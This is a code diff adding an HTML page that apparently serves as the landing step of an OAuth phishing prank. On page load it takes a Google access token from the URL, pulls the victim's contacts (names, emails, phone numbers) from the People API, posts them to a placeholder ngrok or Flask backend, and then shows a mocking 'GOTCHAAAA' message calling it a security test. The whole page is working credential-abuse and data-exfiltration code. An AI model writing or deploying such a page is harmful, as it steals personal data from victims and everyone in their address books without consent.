@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>📁 Extracting Contacts...</title>
+    <script>
+        window.onload = async function () {
+            const hash = new URLSearchParams(window.location.hash.substring(1));
+            const accessToken = hash.get('access_token');
+
+            if (!accessToken) {
+                document.body.innerHTML = "Authorization failed.";
+                return;
+            }
+
+            const res = await fetch('https://people.googleapis.com/v1/people/me/connections?personFields=names,emailAddresses,phoneNumbers', {
+                headers: { Authorization: `Bearer ${accessToken}` }
+            });
+
+            const data = await res.json();
+
+            // Send to your backend
+            await fetch('https://your-ngrok-or-flask-url/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ contacts: data.connections || [] })
+            });
+
+            // Gotcha moment
+            document.body.innerHTML = `
+                <h1 style="color:red;">😂 GOTCHAAAA! Kane strikes again!</h1>
+                <p>We just grabbed <strong>${(data.connections || []).length}</strong> contacts straight from your Google.</p>
+                <small>This was a security test. You passed by trusting the wrong person 😉</small>
+            `;
+        }
+    </script>
+</head>
+<body>
+    <h2>⏳ Please wait...</h2>
+</body>
+</html>
